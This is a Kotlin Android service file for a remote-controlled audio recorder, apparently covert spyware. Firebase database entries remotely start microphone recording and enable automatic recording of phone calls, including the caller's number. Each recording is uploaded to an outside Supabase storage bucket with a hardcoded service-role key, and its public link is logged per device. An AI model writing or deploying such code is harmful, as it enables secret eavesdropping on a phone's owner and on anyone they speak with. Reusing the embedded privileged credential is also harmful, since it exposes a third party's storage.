package com.example.devsync

import android.app.*
import android.content.Intent
import android.media.MediaRecorder
import android.os.*
import android.provider.Settings
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File

class RecordingService : Service() {

    companion object {
        const val DB_URL       = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
        const val SUPABASE_URL = "https://xzslribjzliewpyattcl.supabase.co"
        const val SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh6c2xyaWJqemxpZXdweWF0dGNsIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3ODc4OTY1NywiZXhwIjoyMDk0MzY1NjU3fQ.bZ2kCJesIeeTbZ5L1GrNzYAaDK5v3Ba8-R-SGWIU-A8"
        const val BUCKET       = "recordings"
    }

    private val deviceId by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }
    private val database by lazy {
        FirebaseDatabase.getInstance(DB_URL).getReference("devices/$deviceId")
    }
    private val regRef by lazy {
        FirebaseDatabase.getInstance(DB_URL).getReference("registered_devices/$deviceId")
    }

    private var mediaRecorder: MediaRecorder? = null
    private var currentFile: File?            = null
    private var recordingJob: Job?            = null
    private var isRecording = false

    private var phoneStateListener: PhoneStateListener? = null
    private var callRecordingEnabled = false
    private var inCall = false

    private val httpClient = OkHttpClient.Builder()
        .callTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
        .build()

    override fun onCreate() {
        super.onCreate()
        startForeground()
        setupFirebaseListeners()
        setupCallRecording()
    }

    private fun startForeground() {
        val channelId = "recording_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(channelId, "Recording Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
        val notif = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Recording Service")
            .setContentText("Listening for remote commands")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
        startForeground(1002, notif)
    }

    private fun setupFirebaseListeners() {
        // Remote start mic recording
        database.child("start_recording").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (snapshot.exists()) {
                    val durationSec = snapshot.getValue(Long::class.java) ?: 30L
                    database.child("start_recording").removeValue()
                    if (!isRecording) startMicRecording(durationSec)
                }
            }
            override fun onCancelled(e: DatabaseError) {}
        })

        // Remote stop
        database.child("stop_recording").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (snapshot.exists() && snapshot.getValue(Boolean::class.java) == true) {
                    database.child("stop_recording").removeValue()
                    stopAndUpload("mic")
                }
            }
            override fun onCancelled(e: DatabaseError) {}
        })

        // Call recording toggle
        database.child("call_recording_enabled").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                callRecordingEnabled = snapshot.getValue(Boolean::class.java) ?: false
                regRef.child("callRecordingEnabled").setValue(callRecordingEnabled)
            }
            override fun onCancelled(e: DatabaseError) {}
        })
    }

    // ── MIC RECORDING ──────────────────────────────────────────────────────────

    private fun startMicRecording(durationSec: Long) {
        try {
            val file = File(cacheDir, "mic_${System.currentTimeMillis()}.m4a")
            currentFile = file

            @Suppress("DEPRECATION")
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128000)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }

            isRecording = true
            reportStatus("🎙️ Recording started (${durationSec}s)...")

            recordingJob = CoroutineScope(Dispatchers.IO).launch {
                delay(durationSec * 1000)
                withContext(Dispatchers.Main) { stopAndUpload("mic") }
            }
        } catch (e: Exception) {
            reportStatus("❌ Recording error: ${e.message}")
        }
    }

    // ── CALL RECORDING ─────────────────────────────────────────────────────────

    private fun setupCallRecording() {
        val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager

        phoneStateListener = object : PhoneStateListener() {
            @Suppress("DEPRECATION")
            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                when (state) {
                    TelephonyManager.CALL_STATE_OFFHOOK -> {
                        // Call connected
                        if (callRecordingEnabled && !inCall) {
                            inCall = true
                            startCallRecording(phoneNumber ?: "unknown")
                        }
                    }
                    TelephonyManager.CALL_STATE_IDLE -> {
                        // Call ended
                        if (inCall) {
                            inCall = false
                            stopAndUpload("call")
                        }
                    }
                }
            }
        }

        @Suppress("DEPRECATION")
        tm.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
    }

    private fun startCallRecording(number: String) {
        try {
            val file = File(cacheDir, "call_${number}_${System.currentTimeMillis()}.m4a")
            currentFile = file

            @Suppress("DEPRECATION")
            mediaRecorder = MediaRecorder().apply {
                // Try VOICE_CALL first (works on some devices), fallback to MIC
                try {
                    setAudioSource(MediaRecorder.AudioSource.VOICE_CALL)
                } catch (e: Exception) {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                }
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128000)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }

            isRecording = true
            reportStatus("📞 Call recording: $number...")
        } catch (e: Exception) {
            reportStatus("❌ Call recording error: ${e.message}")
        }
    }

    // ── STOP + UPLOAD ──────────────────────────────────────────────────────────

    private fun stopAndUpload(type: String) {
        recordingJob?.cancel()
        try {
            mediaRecorder?.stop()
            mediaRecorder?.release()
        } catch (_: Exception) {}
        mediaRecorder = null
        isRecording = false

        val file = currentFile ?: return
        if (!file.exists() || file.length() == 0L) {
            reportStatus("❌ Recording file empty")
            return
        }

        reportStatus("⏫ Uploading $type recording...")
        CoroutineScope(Dispatchers.IO).launch {
            uploadToSupabase(file, type)
        }
    }

    private fun uploadToSupabase(file: File, type: String) {
        try {
            val bytes    = file.readBytes()
            val fileName = "${type}_${deviceId.takeLast(6)}_${System.currentTimeMillis()}.m4a"

            val body = bytes.toRequestBody("audio/mp4".toMediaType())
            val req  = Request.Builder()
                .url("$SUPABASE_URL/storage/v1/object/$BUCKET/$fileName")
                .header("Authorization", "Bearer $SUPABASE_KEY")
                .header("apikey", SUPABASE_KEY)
                .header("Content-Type", "audio/mp4")
                .header("x-upsert", "true")
                .post(body)
                .build()

            httpClient.newCall(req).execute().use { response ->
                if (response.isSuccessful) {
                    val publicUrl = "$SUPABASE_URL/storage/v1/object/public/$BUCKET/$fileName"
                    FirebaseDatabase.getInstance(DB_URL)
                        .getReference("recordings").push()
                        .setValue(mapOf(
                            "deviceId"  to deviceId,
                            "type"      to type,
                            "url"       to publicUrl,
                            "timestamp" to System.currentTimeMillis(),
                            "fileName"  to fileName
                        ))
                    reportStatus("✅ ${type.replaceFirstChar{it.uppercase()}} recording uploaded")
                } else {
                    val err = response.body?.string()?.take(100) ?: "no body"
                    reportStatus("❌ Upload failed ${response.code}: $err")
                }
            }
            file.delete()
        } catch (e: Exception) {
            reportStatus("❌ Upload error: ${e.message?.take(80)}")
        }
    }

    private fun reportStatus(status: String) {
        regRef.child("lastStatus").setValue(status)
        regRef.child("lastStatusTime").setValue(ServerValue.TIMESTAMP)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        recordingJob?.cancel()
        try { mediaRecorder?.stop(); mediaRecorder?.release() } catch (_: Exception) {}
        @Suppress("DEPRECATION")
        (getSystemService(TELEPHONY_SERVICE) as TelephonyManager)
            .listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
    }
}
